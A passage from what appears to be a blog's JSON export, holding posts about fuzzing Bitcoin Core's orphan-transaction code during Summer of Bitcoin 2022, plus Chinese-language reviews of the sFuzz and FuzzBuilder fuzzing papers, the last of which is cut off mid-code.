That is the question to fuzzers.\nThe only kind of bug that can be found easily without additional work is program crash, which is also the only behavior that AFL considers to be a bug. But programs can do bad things other than crash. For instance, a hello-world program will never crash, but it always fail to do the expected jobs.\nIn software testing, we use oracle to describe a source of insight into whether a program run did what it was supposed to do. The general term for a way to decide if a particular execution of a program is “good” or “bad” (if a test fails or passes, for example) is oracle.\nAdding assert statements is one well-established way to make programs have oracle power. An assert just checks that something that ought to be true at runtime is true, and crashes the program if it isn’t. Another way to get more crashes automatically is to compile a program with a sanitizer. For example when using clang, adding -fsanitize=address will make the program crash if it performs a variety of unsafe memory operations that might otherwise not cause a problem, or at least not an obvious problem leading to a crash.\nMutation testing, compared with coverage, can provide more valuable information on oracle power. The basic idea of mutation testing is very simple: add new fake bugs by making small changes to the program then grade the testing effort according to how many bugs can be found.\nTo perform mutation analysis on Bitcoin, researchers generated mutations for code in the tx_verify.cpp file. Fuzzing covers 96 of 98 lines of code, 8 of 8 functions, and 74 of 102 branches for this file, guaranteeing that mutation testing will not primarily reflect missing coverage. Comparing coverage to that for functional testing, the fuzz testing has very slightly lower branch coverage, but the numbers are almost identical (72.5% vs. 73%), and the fuzz testing covers different branches than the functional testing. The missing lines are different for functional and fuzz testing as well. Figure 2 summarizes mutation analysis of the file tx_verify.cpp, which is critical to checking transactions for correctness.\nFuzzing adds only two unique mutant kills beyond those produced by the functional testing. This raises the question: why fuzz if we already have functional tests with high code coverage? The answer lies in the fact that, even in the presence of such high-quality tests, fuzzing uncovers subtle bugs that functional tests designed by humans will almost never detect, e.g. https://github.com/bitcoin/bitcoin/issues/22450. A major purpose of fuzzing is to address limits in more traditional functional testing, where known inputs are paired with expected behavior. While functional or unit testing is very powerful, the kinds of bugs found in vulnerabilities often involve the kind of inputs that don’t appear in normal unit/functional tests, as shown by the success of fuzzing and security audits. Fuzzing is not a replacement for functional/unit tests, and functional/unit tests are not a replacement for fuzzing too.\nConclusion and Future Work One conclusion is that the most effective way to improve fuzzing at present might be not to focus on covering the code and state space, but to focus on increasing the oracle power of all Bitcoin Core testing. Arguably, the greatest weakness of traditional code coverage is that it focuses too much attention on the input side of testing and too little on the oracle side, which is easier for even dedicated testing efforts to neglect in the pursuit of covering every branch and path.\nBitcoin Core is a open source software, which means everyone can contribute to its fuzzing infrastructure. Luckily, I got selected as one of the 83 students that will participate in Summer of Bitcoin 2022. Under the guidance of MarcoFalke, I will add a specific fuzz target for orphan transaction handling, which was the source of several DoS attack vectors in the past. By contributing to Bitcoin Core, I can learn a lot about transaction relay in the Bitcoin P2P network and hopefully find potential security issues in the code.\nAcknowledgements Thanks to Marco Falke and all the other Bitcoin developers for their excellent demonstration of open source collaboration, which was the basis for my research into the evolution of Bitcoin development.\nThanks to the Summer of Bitcoin event organizing committee and sponsors like Chaincode Labs for guiding and supporting students in bitcoin development.\nThanks to Professor Alex Groce of Northern Arizona University for his contributions to software security analysis and fuzzing. His papers and blogs are really informative and lively.\nReference Groce, Alex, and Kush Jain. 2022. “Looking for Lacunae in Bitcoin Core’s Fuzzing Efforts.” International Conference on Software Engineering, 2.\n“Bug Disclosure Guidelines.” n.d. OSS-Fuzz. https://google.github.io/oss-fuzz/getting-started/bug-disclosure-guidelines/.\nChen, Yuanliang, Yu Jiang, Fuchen Ma, Jie Liang, Mingzhe Wang, Chijin Zhou, Xun Jiao, and Zhuo Su. 2019a. “EnFuzz: Ensemble Fuzzing with Seed Synchronization Among Diverse Fuzzers.” In USENIX Security Symposium.\n“EnFuzz: Ensemble Fuzzing with Seed Synchronization Among Diverse Fuzzers.” In 28th USENIX Security Symposium (USENIX Security 19), 1967–83. Santa Clara, CA: USENIX Association. https://www.usenix.org/conference/usenixsecurity19/presentation/chen-yuanliang.\n“ClusterFuzz.” n.d. ClusterFuzz. https://google.github.io/clusterfuzz/.\n“CVE-2012-3789.” n.d. CVE-2012-3789 - Bitcoin Wiki. https://en.bitcoin.it/wiki/CVE-2012-3789.\nDietterichl, Thomas G. 2002. “Ensemble Learning.” In The Handbook of Brain Theory and Neural Networks, edited by M. Arbib, 405–8. MIT Press.\nFioraldi, Andrea, Dominik Maier, Heiko Eißfeldt, and Marc Heuse. 2020. “{AFL++}: Combining Incremental Steps of Fuzzing Research.” In 14th USENIX Workshop on Offensive Technologies (WOOT 20).\nGaray, Juan, Aggelos Kiayias, and Nikos Leonardos. 2015. “The Bitcoin Backbone Protocol: Analysis and Applications.” In Annual International Conference on the Theory and Applications of Cryptographic Techniques, 281–310. Springer.\nGoogle, Project Zero team at. 2015. Feedback and Data-Driven Updates to Google’s Disclosure Policy. https://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html.\nGroce, Alex, Chaoqiang Zhang, Mohammad Amin Alipour, Eric Eide, Yang Chen, and John Regehr. 2013. “Help, Help, i’m Being Suppressed! The Significance of Suppressors in Software Testing.” In 2013 IEEE 24th International Symposium on Software Reliability Engineering (ISSRE), 390–99. https://doi.org/10.1109/ISSRE.2013.6698892.\nGroce, Alex, Chaoqiang Zhang, Eric Eide, Yang Chen, and John Regehr. 2012. “Swarm Testing.” In Proceedings of the 2012 International Symposium on Software Testing and Analysis, 78–88. ISSTA 2012. New York, NY, USA: Association for Computing Machinery. https://doi.org/10.1145/2338965.2336763.\nGroce, Posted byAlex. 2021. “Oracles and Mutation Testing: Adding Bugs to Code for Fun and Profit.” How to Test It. https://howtotestit.wordpress.com/2021/03/31/oracles-and-mutation-testing-adding-bugs-to-code-for-fun-and-profit/.\n“Honggfuzz.” n.d. Honggfuzz. https://honggfuzz.dev/.\nImtiaz, Muhammad Anas, David Starobinski, and Ari Trachtenberg. 2020. “Characterizing Orphan Transactions in the Bitcoin Network.” In 2020 IEEE International Conference on Blockchain and Cryptocurrency (ICBC), 1–9.\nNakamoto, Satoshi. 2008. “Bitcoin Whitepaper.” URL: Https://Bitcoin. Org/Bitcoin. Pdf-(: 17.07. 2019).\n“Oss-Fuzz: Five Months Later, and Rewarding Projects.” n.d. Google Open Source Blog. https://opensource.googleblog.com/2017/05/oss-fuzz-five-months-later-and.html.\nPapadakis, Mike, Marinos Kintis, Jie Zhang, Yue Jia, Yves Le Traon, and Mark Harman. 2019. “Chapter Six - Mutation Testing Advances: An Analysis and Survey.” In, edited by Atif M. Memon, 112:275–378. Advances in Computers. Elsevier. https://doi.org/https://doi.org/10.1016/bs.adcom.2018.03.015.\nRegehr, John. n.d. The Saturation Effect in Fuzzing. https://blog.regehr.org/archives/1796.\nSerebryany, Kosta. 2016. “Continuous Fuzzing with Libfuzzer and Addresssanitizer.” In 2016 IEEE Cybersecurity Development (SecDev), 157–57. IEEE.\nSerebryany, Kostya. 2017. “OSS-Fuzz - Google’s Continuous Fuzzing Service for Open Source Software.” Vancouver, BC: USENIX Association.\nSompolinsky, Yonatan, and Aviv Zohar. 2016. “Bitcoin’s Security Model Revisited.” arXiv Preprint arXiv:1605.09193.\n","date":"2022-05-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/bitcoin-fuzz/","tags":["Paper","Bitcoin","Fuzzing"],"title":"Fuzzing Evolution: How developers make Bitcoin more secure"},{"categories":["Experience"],"contents":"What is Summer of Bitcoin?\n a global, online summer internship program focused on introducing university students to bitcoin open-source development and design\n When I started to write my proposal for it, there was only one week to go before the deadline. Luckily, my experience with OSS-Fuzz and my efforts paid off. I am proud to become one of the 83 students who will participate in Summer of Bitcoin 2022 and one of the 5 students to contribute to Bitcoin Core under the guidance of Marco Falke.\nOnboarding to Bitcoin Core After a Jitsi meeting with my mentor, I get some resources.\nhttps://github.com/bitcoin-core/bitcoin-devwiki/wiki/Fuzz-Trophies\nhttps://github.com/bitcoin/bitcoin/blob/master/doc/developer-notes.md\nhttps://github.com/chaincodelabs/onboarding-to-bitcoin-core\nhttps://github.com/chaincodelabs/bitcoin-core-onboarding/blob/main/1.0_bitcoin_core_architecture.asciidoc\nTo compile the fuzzer with lcov enabled:\nfuzzopt=\u0026quot;--enable-fuzz --with-sanitizers=fuzzer\u0026quot; lcovopt=\u0026quot;--enable-lcov --enable-lcov-branch-coverage\u0026quot; CC=clang CXX=clang++ ./configure --enable-debug --with-gui=no $fuzzopt $lcovopt make -j$(nproc)  To test fuzz target and generate coverage report:\n# put seed corpus in qa-assets/fuzz_seed_corpus TARGET=orphanage FUZZ=$TARGET ./src/test/fuzz/fuzz # find . -name \u0026quot;*.gcda\u0026quot; -type f -delete make cov_fuzz # generate html report under fuzz.coverage  Fuzzing Orphan Transaction I made a 5-minute presentation to my classmates, trying to illustrate what orphan transaction is and why it can cause problems.\nI also wrote an article about Bitcoin\u0026rsquo;s fuzzing infrastracture, which has been posted on Summer of Bitcoin\u0026rsquo;s official blog.\nThe code that handles orphan transactions is in src/txorphanage.cpp, of which the code coverage is about 65%.\nTo be specific, 3 out of 8 functions are not covered yet, which are listed below.\nvoid TxOrphanage::AddChildrenToWorkSet(const CTransaction\u0026amp; tx, std::set\u0026lt;uint256\u0026gt;\u0026amp; orphan_work_set) const std::pair\u0026lt;CTransactionRef, NodeId\u0026gt; TxOrphanage::GetTx(const uint256\u0026amp; txid) const void TxOrphanage::EraseForBlock(const CBlock\u0026amp; block)  I find that AddChildrenToWorkSet will be called only when a new tx is validated, then it iterate over its children and try to find some orphan who use it as prevout. These orphans will be added to workset and be processed before a new non-orphan is processed, where GetTx is called.\nThe low-level fuzz target After learning a bit about bitcoin p2p network transaction replay, I just trying to base the orphanage fuzz target on the existing process_message harness. However, I find it difficult to simulate the orphan and unorphan process by consuming random datastream, so fine-grained construction of transaction is needed.\nMy mentor kindly reminded me that I could take a look at the tx_pool_standard target, which constructs well defined transactions. After some research, I was still confused about the setup process, like PeerManager, mempool and transaction validation. Again it was my mentor that gave me some hints.\n For orphan handling we don\u0026rsquo;t care about the layout of the transaction itself.\nThe goal of fuzzing low level (on a \u0026ldquo;unit test\u0026rdquo;/function level) is obviously finer control and mocking capabilities, however it may be less relevant to \u0026ldquo;real world\u0026rdquo; program execution. Thus, it may also be interesting to fuzz on a higher level of, let\u0026rsquo;s say PeerManager.\nI think if you want to implement the low level, you wouldn\u0026rsquo;t need a mempool, just transactions and the txorphanage.\nIf you want to implement the higher level, you will likely need a similar module setup to the process_messages fuzz target. However, the transaction creation part would likely be the same for both fuzz targets.\nImplementing a fuzz target for just the functions in txoprhanage should indeed be simpler.\nI think you can just remove the chainstate/mempool stuff from the tx_pool_standard and then call into txorphanage wherever it called into mempool. (After all, txorphanage is just like the mempool a data structure to store transactions).\nThe tx-creation function you can leave as-is or simplify a bit, as most parts aren\u0026rsquo;t needed.\n After some dumb commits, I created PR#25447 to add low-level fuzz target for txorphanage, which got merged after lots of review and discussion.\nThe bug in Fuzz Target itself Soon after the txorphan fuzz target get merged, my mentor reminded me there was a bug in the fuzz target: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=48914\nI quickly found that that was due to a wrong assertion. AddTx will return false when tx has weight larger than the max limit, I thought it will not have too much weight so I just asserted it should return true if tx is not in m_orphans.\nI submitted the fix in https://github.com/bitcoin/bitcoin/pull/25624 and it got merged.\nAnother bug did not appear until a week later:\n Interestingly, it looks like oss-fuzz found another issue, but didn\u0026rsquo;t report it until now: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=49347\n There are 3 orphans and all of them are erased due to expiration in https://github.com/bitcoin/bitcoin/blob/master/src/txorphanage.cpp#L113-L128. nErased is used to count them but the function only returned nEvicted, which is 0 since they were counted only in the last loop.\nI thought it was a confusing behavior andnErased should be added to nEvicted so the function return the correct number of removed tx, but my mentor argued that returning void is enough. Finally the PR https://github.com/bitcoin/bitcoin/pull/25683 is merged to make small refactoring and fix the error.\n LimitOrphans() removes expired transactions from the orphanage and additionally evicts transactions at random should the limit still be exceeded after removing expired transactions. Before this PR, the number of evicted transactions (excluding the number of expired transactions) was returned, which let to hitting an asserting in the fuzz tests that assumed the return value to be the total number of removed transactions (evicted + expired).\n Package Relay  I am actually thinking that we could look into fuzzing package relay, as package relay will potentially replace txorphans.\nSo my basic idea would be to get a nice function to create a \u0026ldquo;package\u0026rdquo; of transactions. This primitive will be likely be needed by both high-level orphan acceptance handling, as well as mempool package acceptance handling.\n The definition of a package: https://github.com/bitcoin/bitcoin/blob/master/doc/policy/packages.md#definitions\nI have made a draft PR to test package processing, currently it contains some faults, my mentor and I are not so familiar with package processing so we are still trying to figure out the root cause.\nSeminars Week 1 Reading material: https://chaincode.gitbook.io/seminars/bitcoin-protocol-development/welcome-to-the-bitcoin-protocol\nbitcoin-paper-errata-and-details describes known problems in Satoshi Nakamoto\u0026rsquo;s whitepaper and terminology changes in Bitcoin\u0026rsquo;s implementation.\nBitcoin’s Academic Pedigree is a complete survey tracing the origins of the key ideas that Nakamoto applied to Bitcoin. By reading this, we can zero in on Nakamoto\u0026rsquo;s true leap of insight—the specific, complex way in which the underlying components are put together\nAfter reviewing The Incomplete History of Bitcoin Development, I admire the way Nakamoto and his collaborators developed Bitcoin sustainably. If I\u0026rsquo;d Known What We Were Starting emphasizes the trustless nature of Bitcoin, which is forgotten by many short-lived altcoins.\nMoreover, I have learned a lot about Bitcoin\u0026rsquo;s security model by diving deep into the assumptions and guarantees.\nGlossaries I have learned:\n full node, pruned node, SPV node CoinJoin Sybil attack selfish attack checkpoints  Scaling Bitcoin: A trip to the moon requires a rocket with multiple stages describes the limitation of Bitcoin\u0026rsquo;s capacity and scalability, which makes it inefficient for payment. Bitcoin\u0026rsquo;s primary distinguishing values are monetary sovereignty, censorship resistance, trust cost minimization, international accessibility/borderless operation, etc. So it doesn\u0026rsquo;t need to compete with Visa/Mastercard to succeed. The potential of scalable transactions may be achieved by upper layers such as Lightning Network.\nQuestion: Do you believe that bitcoin needs to be competitive with Visa/Mastercard to succeed?\nThe article has explained the reasons why Bitcoin itself is not going to compete with Visa/Mastercard from a technical perspective.\nIf we think from a sociological perspective, Bitcoin cannot replace traditional Visa/Mastercard because of its decentralized nature. The real world runs in a centralized way where the banks are supervised by the governments. Even Bitcoin itself is mostly traded in centralized cryptocurrency exchanges such as Binance, which need approval from regulators to operate. It will be suicide for Bitcoin to become more centralized in order to beat Visa/Mastercard.\nTo conclude, I think it is difficult for Bitcoin to compete with Visa/Mastercard. But it does not have to be used for daily transactions to succeed. It can be a kind of investment just like gold.\nThe answer from my partner:\n In my view, bitcoin is a digital currency, a store-of-value (incorruptible store of value), and a final settlement payment system (if you would like to see it in that way), so it does not compete with Visa or Mastercard, as they mainly focus on selling credits for its users.\nThe bitcoin network needs to focus on its values: sovereignty, privacy, censorship resistance, and others, instead of trying to focus on TPS metrics such as other payment systems which are easily built and replicated in a centralized fashion. If the main values are maintained and persisted we get sound money, and sound infrastructure and not in competing with legacy payment systems.\nI agree with the text author in such a way that the bitcoin because of its core values is the base layer for other ideas, and payment focused systems/layers (such as the lightning network) can be built on, for example, the internet has the same layered structure, as application, transport, network layers, for bitcoin it’s the network layer and with a base protocol set that turns possible to build other layers like transport for lightning and even application layers such as the third-party centralized apps.\nAll that said, bitcoin does not compete with payment or credit systems, it competes with systems that could be a solid base layer, sound money, and store of value, and all the rest can be relied on.\n Week 2 Reading material: https://chaincode.gitbook.io/seminars/bitcoin-protocol-development/segwit\nHow does SegWit affect initial block download (IBD)?\nAs described in Segregated Witness Costs and Risks, SegWit allows larger blocks, which means the transaction and storage cost will be higher.\nBut I find that SegWit can actually speed up IBD by skipping download of historic signatures, as lised in Bitcoin Core 0.14.0 Release Note of IBD Performance Improvements.\n   Release Major improvements in IBD     0.5.0 Skip verification of historic (checkpointed) signatures   0.8.0 Switch to LevelDB \u0026amp; parallel signature validation   0.10.0 Headers-first sync and parallel block download   0.11.0 Optional block file pruning to save disk space   0.12.0 New fast signature validation library written from scratch (libsecp256k1)   0.13.1 Segwit to allow skipping download of historic signatures in the future    The detail can be found in Bitcoin Core 0.13.1 Release Note\n  More efficient almost-full-node security Satoshi Nakamoto’s original Bitcoin paper describes a method for allowing newly-started full nodes to skip downloading and validating some data from historic blocks that are protected by large amounts of proof of work. Unfortunately, Nakamoto’s method can’t guarantee that a newly-started node using this method will produce an accurate copy of Bitcoin’s current ledger (called the UTXO set), making the node vulnerable to falling out of consensus with other nodes. Although the problems with Nakamoto’s method can’t be fixed in a soft fork, Segwit accomplishes something similar to his original proposal: it makes it possible for a node to optionally skip downloading some blockchain data (specifically, the segregated witnesses) while still ensuring that the node can build an accurate copy of the UTXO set for the block chain with the most proof of work. Segwit enables this capability at the consensus layer, but note that Bitcoin Core does not provide an option to use this capability as of this 0.13.1 release.   Week 3 Reading material: https://chaincode.gitbook.io/seminars/bitcoin-protocol-development/mining-network-prop\nCan you ensure the transaction will be processed even if you send it with low fees? Which mechanisms do you have to ensure a stuck transaction (due to low fees) gets processed?\nhttps://zh.braiins.com/blog/btc-transaction-stuck\nWeek 4 Reading material: https://chaincode.gitbook.io/seminars/bitcoin-protocol-development/p2p\nWhat is the rationale behind the \u0026ldquo;new\u0026rdquo;/\u0026ldquo;tried\u0026rdquo; table design? Were there any prior inspirations within the field of distributed computing?\nhttps://residency.chaincode.com/presentations/bitcoin/ethan_heilman_p2p.pdf\n","date":"2022-05-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/summer-of-bitcoin/","tags":["Bitcoin","Fuzzing","Open-Source"],"title":"My Summer of Bitcoin 2022 Experience"},{"categories":["论文"],"contents":"前言 本文将对 ICSE 2020 会议论文 sFuzz: An Efficient Adaptive Fuzzer for Solidity Smart Contracts 进行解读。这篇论文的主要研究内容是综合运用 AFL 的策略和自适应方法来 fuzz 智能合约，并开发为一整套工具，其价值在于这种互补的策略使得 fuzz 更加高效，且达到了较高的代码覆盖率，可以发现更多漏洞。\n论文地址：https://dl.acm.org/doi/10.1145/3377811.3380334\n源码地址：https://github.com/duytai/sFuzz\n论文作者：Tai D. Nguyen, Long H. Pham, Jun Sun, Yun Lin, Quang Tran Minh\n正文 研究背景 现如今，智能合约作为图灵完备的程序在区块链上以分布式自治信任的方式执行，在给各行业带来革命性改变的同时，也有着极大的安全隐患。\n和传统程序不同，智能合约一旦部署上链就无法轻易更改，这使得漏洞具有极强的危害性，近年来对以太坊智能合约的攻击日益增多，其中最著名的便是发生于 2016 年的 The DAO Attack，直接导致了以太坊的硬分叉与社区的分裂。\n本文主要关注自动化测试技术用于发掘智能合约中的漏洞，必须解决以下三个问题：\n 如何运行测试用例 如何生成测试用例 the oracle problem  这里需要解释一下 oracle 的概念，整个以太坊系统可以看作分布式的状态机，为了保证达成共识，避免状态的不一致，链上所有操作都是确定性 (deterministic) 的。但现实世界就是充满不确定性的，oracle 就是和链上链下沟通的中间件，而 oracle 本身又是中心化的，现实世界中的软件安全问题都会在其身上体现，具体有哪些安全问题本文并未详细说明。最早关于以太坊智能合约攻击的研究参见 A Survey of Attacks on Ethereum Smart Contracts SoK，其列举了如 Gasless Send, Reentrancy 等漏洞，详见下表\n针对智能合约的自动化测试之前已经有一些研究，比如 ContractFuzzer 和 Oyente 分别用模糊测试 (fuzzing) 和符号执行 (symbolic execution) 技术来进行自动挖掘。而本文的工作结合了这两种互补的技术，并且使用了一种高效的自适应策略来选取 fuzzing 所用的种子 (seeds) 以解决 AFL-based fuzzing 难以覆盖具有严格进入条件的分支这一问题。\n样例展示 上图为一个简单的猜数字游戏合约程序，调用函数 start_quiz_game 以设置问题和答案，调用函数 Try 来支付 100 finney 并猜测数字，如果答案正确则会向调用者转帐。但该合约程序存在 Gasless Send 漏洞，可能导致调用者的 fallback function 被执行，从而引发 out-of-gas exception。\n要挖掘合约中的漏洞，首先要建立一个区块链网络，配置相应的地址和数额，将合约部署在某一地址上，生成 test case（即一系列交易）来生成参数并调用函数 start_quiz_game 和 Try，但 AFL 随机生成数据的策略很难满足第二个条件，即仅有 1/2^256 的概率生成值为 100 的 uint 数据，所以很难覆盖到这一分支。sFuzz 使用了一种自适应的策略作为补充，定量计算 seed 与分支条件之间的距离，从而使 seed 能越来越接近满足分支条件。这一例子是仅包含一个 just-missed 分支的最简单情形，包含多个分支的 multi-objective 场景也能适用。\n算法细节 基于反馈的 fuzzing 主要思想就是将 test generation problem 变为 optimization problem,使用某种形式的反馈作为 objective function 来解决最优化问题，而 sFuzz 策略的自适应性在于其会根据反馈来改变 objective function，整体上看属于遗传算法，如下图所示。\nInit Polulation 初始化配置，生成多个 test cases（即交易函数调用），在为参数生成随机值时需要注意考虑变长的类型如数组，会先在 [0,255] 内确定个数，再对应生成每个元素的随机值。每个 test case 都会编码成如下 bit vector 的形式\nFit To Survive 适者生存阶段，通过设定如下距离函数来挑选新 seeds\n该阶段算法如下：\n策略受 search-based software testing (SBST) 启发但又更加高效，\nCrossover and Mutation 这一阶段将之前生成的 seeds 进行变异，采用了 AFL 中的所有变异策略，还针对智能合约引入了一些如下新策略：\n检查变异后的数据是否 valid，丢弃 invalid 和重复的结果。为了减少无效工作也同样采用了 AFL 中的启发式方法，比如当对某一块数据进行 WalkingByte 变异操作没有覆盖任何新分支则之后不再变异该块数据。\n具体实现 编写了约 4347 行 C++ 代码，主要有三个组件：\n runner 管理 test case 的执行  获取智能合约的字节码及其 ABI（application binary interface）作为输入，并生成用于分析 ABI 的 bash 脚本 设置用于部署智能合约的区块链网络，并创建一个随机地址池，部署 normal attacker 和 reentrancy attacker   libfuzzer 解决 test 的生成问题  使用前文所述策略选择性地生成 test cases 首先在运行时构建 CFG，因为在 fuzz 之前静态构建是很困难的，EVM 中分支跳转由操作码 jumpi 实现，其操作数是程序动态执行时的目标 PC 值，只有模拟整个栈才能获知，但代价太高。因此在 fuzz 过程中构建 CFG，当执行到 jumpi 时再记录目标并相应作为新节点添加到 CFG 中 。 跳过不改变状态的 view, pure, constant 函数   liboracles 解决 oracle problem  通过 EVM 提供的 hook 机制以监测 test case 的执行 可能存在 false positive    效果验证 Efficient sFuzz 平均每秒可执行 208 个 test cases，明显比 ContractFuzzer 和 Oyente 高效，因为 ContractFuzzer 模拟整个区块链网络，而 sFuzz 仅模拟和智能合约漏洞相关的细节，且其基于 Node.js 和 Go，相比 C++ 低效。而 Oyente 采用符号执行，比 sFuzz 运行得更慢更是理所应当。\nEffective 测量分支覆盖率较困难，因此以覆盖到不同的分支数作为指标。\n绝大部分情况下 sFuzz 比 ContractFuzzer 更有效，少数例外也是由于 sFuzz 不改变状态的函数故而这些函数中的分支未被统计，而且 ContractFuzzer 生成 invalid 的 test cases 根本不符合编译器生成的 mandatory constraints 故而覆盖到了多余的分支。\nOyente 在绝大部分情况下覆盖了更多的分支，因为符号执行可以满足几乎所有分支条件，能发现 integer overflow，但现实中许多 state variable 无法被任意赋值，很多条件根本无法满足，这是其方法上的重大缺陷。\n为了分析 sFuzz 的 soundness，作者手动检查了从结果中随机采样的智能合约，最终数量和真阳率结果如下表所示：\nAdaptiveness 图表说明 AFL 的策略容易覆盖大多数分支，而自适应策略平均来讲也贡献了三成的 test cases。而且仅仅是运行了两分钟的结果，延长运行时间效果还会提高。\n相关工作 智能合约 Fuzzer：ContractFuzzer 可以检查7种不同类型的漏洞，但并没有使用任何反馈来改进。Echidna 据说能够检查合约是否违反了某些用户预定义的属性，但未找到任何相关出版物。\n符号执行引擎：有 teEther 和 MAIAN，sFuzz 可以与之结合形成混合的 fuzzing engine\n还可与形式化验证 (formal verification) 和对智能合约的分析相联系\n成果总结 针对智能合约的 Fuzz 是较新的领域，ContractFuzzer 应该是最早且引用最多的文章，而本文提出的 sFuzz 主要贡献在于使用自适应的策略以有效地覆盖 AFL 无法进入的分支。个人有收获的点：对问题的定义，test case 的表示（将函数调用编码为 bit vector），遗传算法部分是关键但缺乏相关背景无法完全理解。\n参考文献 [1] Nguyen, Tai D., et al. \u0026ldquo;sfuzz: An efficient adaptive fuzzer for solidity smart contracts.\u0026rdquo; Proceedings of the ACM/IEEE 42nd International Conference on Software Engineering. 2020.\n[2] Jiang, Bo, Ye Liu, and W. K. Chan. \u0026ldquo;Contractfuzzer: Fuzzing smart contracts for vulnerability detection.\u0026rdquo; 2018 33rd IEEE/ACM International Conference on Automated Software Engineering (ASE). IEEE, 2018.\n[3] Atzei, Nicola, Massimo Bartoletti, and Tiziana Cimoli. \u0026ldquo;A survey of attacks on ethereum smart contracts (sok).\u0026rdquo; International conference on principles of security and trust. Springer, Berlin, Heidelberg, 2017.\n[4] Luu, Loi, et al. \u0026ldquo;Making smart contracts smarter.\u0026rdquo; Proceedings of the 2016 ACM SIGSAC conference on computer and communications security. 2016.\n[5] Grieco, Gustavo, et al. \u0026ldquo;Echidna: effective, usable, and fast fuzzing for smart contracts.\u0026rdquo; Proceedings of the 29th ACM SIGSOFT International Symposium on Software Testing and Analysis. 2020.\n","date":"2022-04-07T13:46:52Z","permalink":"https://chinggg.github.io/post/sfuzz/","tags":["论文笔记","安全","Fuzz","BlockChain"],"title":"sFuzz: 高效自适应的智能合约 fuzz"},{"categories":["论文"],"contents":"本文将对 ACSAC 2019 会议论文 FuzzBuilder: Automated building greybox fuzzing environment for C/C++ library 进行解读。这篇论文的主要亮点是利用单元测试为没有可执行文件的库自动生成 Fuzz 环境，通过修改 LLVM IR 以收集 seeds 并生成 executable。\n论文地址：https://dl.acm.org/doi/10.1145/3359789.3359846\n源码地址：https://github.com/hksecurity/FuzzBuilder\n幻灯地址：https://www.acsac.org/2019/program/final/1/265.pdf\n论文作者：Joonun Jang(Samsung Research), Huy Kang Kim(Korea University)\n引言 Greybox fuzzing has been researched extensively, which is well known for its advantage of not only being able to test with only binarie but also useful when source code is available. Therefore, it is necessary to apply greybox fuzzing to a development process to prevent security vulnerabilities at an early stage.\nSince greybox fuzzing requires execution of program, things get tough when it comes to library fuzzing. A simple approach for fuzzing a library is to generate an executable that calls library API functions and then fuzzing the generated executable. To this end, testers should manually write code that achieves high code coverage, which is a labor-intensive job requiring in-depth knowledge of libraries.\nSo we propose a novel approach to generate executables automatically through analysis of unit tests in project。\n动机背景 Library Fuzzing vulnerabilities in libraries can be more critical\nlibrary API: a set of functions that a library exports\nlibrary fuzzing requires a set of instructions to call library API functions with input values\n提到了 Libfuzzer，只需实现 LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)，在其中以 data 和 size 为参数调用 library API function 即可。还需选择一个 base function，其将数据载入内存以供 library 使用，接着就能选取其他的 library API functions 以 test various features of a library.\n想要自动化这个过程，生成的 executable 要能够：\n 从 fuzzer 中获取值 将值通过 base function 传给 target library 调用与 base function 相关联的不同 library API function  Function Sequence   a set of functions to be tested jointly\n  order of calling library API functions should be considered\n  various function sequences should be considered\n  Fuzzable API   a base library API function used to pass fuzzer inputs to library\n  generated executable should include (FA)+\n  Unit Test 前面的定义都是理论，此时图穷匕现，实际上 FuzzBuilder 单纯就是 generate executables and seeds by using prepared function sequences and test inputs in unit tests\na successful unit test should have:\n various function sequences a variety of test inputs high code coverage (as a result)  另外 3.2 节中还有对 unit tests 的两个假设，也是 JUnit 提倡的最佳实践:\n each test is implemented as a function each test is independent of each other  实验方法 文章的核心，要实现 automated generation of executable and seed，重点是 executable，注意虽然表述为 executable generation 但代码本身只是修改 LLVM bitcode，还需手动编译链接，难点主要在于熟练掌握 LLVM IR Builder API 以实现全局变量的创建和分支跳转。\nProcess of Seed Generation:\n Modify library FA so it will write input to a file Remake and execute unit test Store seeds to separate files  Process of Executable Generation:\n select FA preprocess: collecting test functions insert_interface: getting input from fuzzers remove_test: removing unnecessary test functions insert_operands: replacing operands of FA  用户配置如下\n// https://github.com/libexpat/libexpat // seed.conf，收集 seeds 时使用 { \u0026quot;targets\u0026quot; : [ [ \u0026quot;XML_Parse\u0026quot;, 2, 3 ]], \u0026quot;files\u0026quot; : [ \u0026quot;xmlparse.bc\u0026quot; ] } // bug.conf，生成 exe 时使用 { \u0026quot;targets\u0026quot; : [ [\u0026quot;XML_Parse\u0026quot;, 2, 3] ], \u0026quot;files\u0026quot; : [ \u0026quot;runtests.bc\u0026quot; ], \u0026quot;tests\u0026quot; : [ \u0026quot;test_\u0026quot; ], \u0026quot;skips\u0026quot; : [\u0026quot;test_alloc_nested_groups\u0026quot;, \u0026quot;test_ABC\u0026quot;] }  其中 targets 就是 Fuzzable API 的列表，函数名后跟着两个分别是 buf 和 len 在该函数 args 中的位置（从1开始计数），files 是要读取并修改的 LLVM bitcode 文件，会作为 Module 加载到 IRReader 中。test 和 skip 只有在生成 exe 时使用，前者用于粗略获取单元测试函数，后者用于排除。\n收集 seed 就是要获取单元测试的输入，修改 library FA，用 LLVM IRBuilder 在函数的 entry block 插入一段 BB，将输入数据写入 COLLECT_PATH 指定的文件中，再 Br 回原来的 BB 继续执行，具体实现在 IRWriter::collect() 中。\n将修改后的 .mod.bc 编译为 .o，并 ar 到整个库的 .a 上，再运行单元测试，数据就会被写入到指定文件，运行 seed_maker.py 会再读取并整齐地保存到 seeds 目录下。\n（一个坑点是收集完 seed 后 .o 仍处于被修改状态，记得用原来的代码重新编译，否则后续 Fuzz 的输入通通都会写入文件，直接挤爆硬盘）\n生成 executable 需要在单元测试的 IR 上插桩，先让 IRReader 遍历 modules 按用户配置的 tests 和 skips 收集所有 targets（不是 FA 而是 test_ABC） 以备后面插桩使用。然后在 modules 中找到 entry function（即运行单元测试的入口 main 函数），IRWriter::interface() 先在对应 module 中创建 global 的 buf 和 size，set CommonLinkage 并初始化为0， 然后在 entry block 插入 BB，在循环中以 4K 为单位 read stdin 到栈上的 tmp，并每次在堆上分配更大的空间，拷贝之前的 global buf 和新读入的 tmp，将 global buf 原来的空间释放后指向新分配的空间，直到 read 不足 4K 或返回 -1，这样就插入了一个 interface 将标准输入全部读到 global buf 中。\n可将插入 interface 的 LLVM IR 翻译为如下 C 代码\nchar* fuzzbuilder_buf; int fuzzbuilder_size; int main() { entry1: char *tmp = alloca(4096); // GEP in 